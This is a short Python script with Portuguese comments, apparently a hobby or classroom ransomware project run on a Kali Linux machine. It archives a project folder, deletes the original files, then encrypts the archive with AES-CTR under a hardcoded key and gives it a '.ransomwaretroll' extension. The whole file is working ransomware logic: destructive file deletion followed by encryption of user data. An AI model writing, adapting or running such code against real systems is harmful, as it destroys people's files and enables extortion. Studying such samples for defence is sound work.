import os
import pyaes
import shutil
import zipfile as zipador
import tempfile
from os import listdir
from os.path import isfile, join, basename

#Compacta o conteudo do Diretorio
def  zipar(arqs):
	with zipador.ZipFile('TePeguei.ransom','w', zipador.ZIP_DEFLATED) as z:
		for arq in arqs:
			if(os.path.isfile(arq)): #Se For Arquivo
				z.write(arq) 
			else:
				for root, dirs, files in os.walk(arq):
					for f in files: 
						z.write(os.path.join(root,f))
zipar(['teste.txt','projeto-ransom']) #Compacta Tudo
path_origem = os.getcwd()
#path_destino = '/home/tmp'
def move(path_origem, path_destino, ext='ransom'):
	for item in [join(path_origem, o) for o in listdir(path_origem) if isfile(join(path_origem, o)) and o.endswith(ext)]:
		#print(item)
		shutil.move(item, join(path_destino, basename(item)))
		print('moved "{}"'.format(item, join(path_destino, basename(item))))
#	destinotmp = '/home/kali/tmp'
#	if not path_destinotmp.exists():
#		os.makedirs(path_destinotmp)
if __name__ == '__main__':
	move('/home/kali/projeto-ransom/', '/home/kali/tmp/')
#dir = os.getcwd()
path = '/home/kali/projeto-ransom/'
dirs = os.listdir(path)
for file in dirs:
	os.remove(file)

def move2(path_origem, path_destino, ext='ransom'):
	for item in [join(path_origem, o) for o in listdir(path_origem) if isfile(join(path_origem, o)) and o.endswith(ext)]:
		#print(item)
		shutil.move(item, join(path_destino, basename(item)))
		print('moved "{}"'.format(item, join(path_destino, basename(item))))
#	destinotmp = '/home/kali/tmp'
#	if not path_destinotmp.exists():
#		os.makedirs(path_destinotmp)
if __name__ == '__main__':
	move2('/home/kali/tmp/','/home/kali/projeto-ransom/')

#Abre Arquivo a Ser Criptografado
file_name = "TePeguei.ransom"
file = open(file_name, "rb")
file_data = file.read()
file.close()

#Apaga o Arquivo
os.remove(file_name)

#chave de chiptografia
key = b"voceselascoufoi?"
aes = pyaes.AESModeOfOperationCTR(key)

#Criptografa
crypto_data = aes.encrypt(file_data)
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
